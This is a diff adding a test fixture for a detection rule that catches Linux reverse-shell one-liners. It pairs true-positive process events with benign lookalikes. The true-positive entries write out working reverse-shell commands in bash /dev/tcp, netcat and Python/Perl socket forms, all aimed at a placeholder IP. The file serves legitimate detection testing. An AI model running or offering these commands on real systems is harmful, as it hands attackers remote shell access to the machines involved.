@@ -1,0 +1,57 @@
+rule: rules/linux/process_creation/proc_creation_lnx_reverse_shell_oneliner.yml
+true_positive:
+    - name: Bash /dev/tcp reverse shell
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/bash'
+          CommandLine: "bash -i >& /dev/tcp/198.51.100.20/4444 0>&1"
+          User: 'www-data'
+    - name: Netcat with executable payload
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/nc'
+          CommandLine: 'nc -e /bin/sh 198.51.100.20 9001'
+          User: 'www-data'
+    - name: Netcat FIFO back-channel
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/sh'
+          CommandLine: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 198.51.100.20 4444 >/tmp/f'
+          User: 'root'
+    - name: Python socket reverse shell
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/python3'
+          CommandLine: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"198.51.100.20\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"
+          User: 'www-data'
+    - name: Perl socket reverse shell
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/perl'
+          CommandLine: "perl -e 'use Socket;$i=\"198.51.100.20\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton($i)));open(STDIN,\">&S\");exec(\"/bin/sh -i\");'"
+          User: 'www-data'
+false_positive:
+    - name: Routine package installation
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/apt-get'
+          CommandLine: 'apt-get install -y nginx'
+          User: 'root'
+    - name: Netcat used to copy a file without -e
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/nc'
+          CommandLine: 'nc -w 3 10.0.0.5 8080 < backup.tar.gz'
+          User: 'deploy'
+    - name: Python script that opens a socket but never duplicates descriptors
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/python3'
+          CommandLine: "python3 -c 'import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.5\",5432));print(s.recv(16))'"
+          User: 'monitoring'
+    - name: Health check using the documented timeout pattern
+      event:
+          _logsource: {product: linux, category: process_creation}
+          Image: '/usr/bin/bash'
+          CommandLine: 'timeout 1 bash -c "cat < /dev/null > /dev/tcp/10.0.0.5/5432"'
+          User: 'monitoring'
